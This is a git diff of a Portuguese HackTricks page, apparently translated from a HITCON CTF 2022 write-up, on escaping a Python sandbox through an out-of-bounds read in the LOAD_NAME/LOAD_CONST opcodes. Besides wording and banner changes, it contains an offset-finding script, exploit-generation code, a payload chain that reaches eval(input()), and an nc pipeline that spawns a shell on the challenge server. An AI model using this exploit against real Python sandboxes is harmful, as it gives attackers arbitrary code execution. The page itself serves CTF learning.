@@ -1,24 +1,25 @@
 # LOAD_NAME / LOAD_CONST opcode OOB Read
 
+{% hint style="success" %}
+Aprenda e pratique Hacking na AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Treinamento HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Aprenda e pratique Hacking no GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Treinamento HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Apoie o HackTricks</summary>
 
-Outras maneiras de apoiar o HackTricks:
-
-* Se você quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
-* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
-* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.
+* Verifique os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
+* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Compartilhe truques de hacking enviando PRs para os repositórios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
+{% endhint %}
 
 **Essas informações foram retiradas** [**deste artigo**](https://blog.splitline.tw/hitcon-ctf-2022/)**.**
 
 ### TL;DR <a href="#tldr-2" id="tldr-2"></a>
 
-Podemos usar a funcionalidade de leitura OOB no opcode LOAD_NAME / LOAD_CONST para obter algum símbolo na memória. O que significa usar truques como `(a, b, c, ... centenas de símbolos ..., __getattribute__) if [] else [].__getattribute__(...)` para obter um símbolo (como o nome de uma função) desejado.
+Podemos usar a funcionalidade de leitura OOB no opcode LOAD_NAME / LOAD_CONST para obter algum símbolo na memória. Isso significa usar truques como `(a, b, c, ... centenas de símbolos ..., __getattribute__) if [] else [].__getattribute__(...)` para obter um símbolo (como o nome de uma função) desejado.
 
 Em seguida, basta criar seu exploit.
 
@@ -47,7 +48,7 @@ Vamos começar com um exemplo simples, `[a, b, c]` poderia ser compilado no segu
 6 BUILD_LIST               3
 8 RETURN_VALUE12345
 ```
-Mas e se os `co_names` se tornarem uma tupla vazia? O opcode `LOAD_NAME 2` ainda é executado e tenta ler o valor daquele endereço de memória onde originalmente deveria estar. Sim, isso é uma "característica" de leitura fora dos limites.
+Mas e se o `co_names` se tornar uma tupla vazia? O opcode `LOAD_NAME 2` ainda é executado e tenta ler o valor daquele endereço de memória onde originalmente deveria estar. Sim, isso é uma "característica" de leitura fora dos limites.
 
 O conceito principal para a solução é simples. Alguns opcodes no CPython, por exemplo, `LOAD_NAME` e `LOAD_CONST`, são vulneráveis (?) à leitura fora dos limites.
 
@@ -61,19 +62,19 @@ PUSH(value);
 FAST_DISPATCH();
 }1234567
 ```
-Desta forma, podemos usar o recurso OOB para obter um "nome" de um deslocamento de memória arbitrário. Para garantir qual nome ele tem e qual é o seu deslocamento, basta continuar tentando `LOAD_NAME 0`, `LOAD_NAME 1` ... `LOAD_NAME 99` ... E você pode encontrar algo em cerca de oparg > 700. Você também pode tentar usar o gdb para dar uma olhada no layout da memória, é claro, mas eu não acho que seria mais fácil?
+Desta forma, podemos usar o recurso OOB para obter um "nome" de um deslocamento de memória arbitrário. Para garantir qual é o nome e qual é o deslocamento, basta continuar tentando `LOAD_NAME 0`, `LOAD_NAME 1` ... `LOAD_NAME 99` ... E você pode encontrar algo em cerca de oparg > 700. Você também pode tentar usar o gdb para dar uma olhada no layout da memória, é claro, mas eu não acho que seria mais fácil?
 
 ### Gerando o Exploit <a href="#generating-the-exploit" id="generating-the-exploit"></a>
 
-Uma vez que recuperamos esses deslocamentos úteis para nomes / constantes, como _obtemos_ um nome / constante a partir desse deslocamento e o usamos? Aqui está um truque para você:\
-Vamos supor que podemos obter um nome `__getattribute__` a partir do deslocamento 5 (`LOAD_NAME 5`) com `co_names=()`, então basta fazer o seguinte:
+Depois de recuperarmos esses deslocamentos úteis para nomes / constantes, como _obtemos_ um nome / constante desse deslocamento e o usamos? Aqui está um truque para você:\
+Vamos supor que podemos obter um nome `__getattribute__` do deslocamento 5 (`LOAD_NAME 5`) com `co_names=()`, então basta fazer o seguinte:
 ```python
 [a,b,c,d,e,__getattribute__] if [] else [
 [].__getattribute__
 # you can get the __getattribute__ method of list object now!
 ]1234
 ```
-> Observe que não é necessário nomeá-lo como `__getattribute__`, você pode nomeá-lo como algo mais curto ou mais estranho
+> Note que não é necessário nomeá-lo como `__getattribute__`, você pode nomeá-lo como algo mais curto ou mais estranho
 
 Você pode entender a razão por trás disso apenas visualizando seu bytecode:
 ```python
@@ -92,7 +93,7 @@ Você pode entender a razão por trás disso apenas visualizando seu bytecode:
 24 BUILD_LIST               1
 26 RETURN_VALUE1234567891011121314
 ```
-Observe que `LOAD_ATTR` também recupera o nome de `co_names`. O Python carrega nomes a partir do mesmo deslocamento se o nome for o mesmo, então o segundo `__getattribute__` ainda é carregado a partir do deslocamento=5. Usando esse recurso, podemos usar um nome arbitrário uma vez que o nome esteja na memória próxima.
+Observe que `LOAD_ATTR` também recupera o nome de `co_names`. O Python carrega nomes a partir do mesmo deslocamento se o nome for o mesmo, então o segundo `__getattribute__` ainda é carregado a partir do deslocamento=5. Usando esse recurso, podemos usar um nome arbitrário uma vez que o nome está na memória próxima.
 
 Para gerar números deve ser trivial:
 
@@ -105,7 +106,7 @@ Para gerar números deve ser trivial:
 
 Não usei constantes devido ao limite de comprimento.
 
-Primeiro, aqui está um script para encontrar esses deslocamentos de nomes.
+Aqui está um script para encontrar esses deslocamentos de nomes.
 ```python
 from types import CodeType
 from opcode import opmap
@@ -140,7 +141,7 @@ print(f'{n}: {ret}')
 
 # for i in $(seq 0 10000); do python find.py $i ; done1234567891011121314151617181920212223242526272829303132
 ```
-E o seguinte é para gerar o exploit real em Python.
+E o seguinte é para gerar o exploit Python real.
 ```python
 import sys
 import unicodedata
@@ -217,7 +218,7 @@ print(source)
 # (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
 ```
-Basicamente, ele faz as seguintes coisas, para aquelas strings que obtemos do método `__dir__`:
+Basicamente faz as seguintes coisas, para as strings que obtemos do método `__dir__`:
 ```python
 getattr = (None).__getattribute__('__class__').__getattribute__
 builtins = getattr(
@@ -230,16 +231,17 @@ getattr(
 '__repr__').__getattribute__('__globals__')['builtins']
 builtins['eval'](builtins['input']())
 ```
+{% hint style="success" %}
+Aprenda e pratique AWS Hacking: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Aprenda e pratique GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Suporte o HackTricks</summary>
 
-Outras maneiras de apoiar o HackTricks:
-
-* Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
-* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
-* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.
+* Verifique os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
+* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Compartilhe truques de hacking enviando PRs para os repositórios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
+{% endhint %}
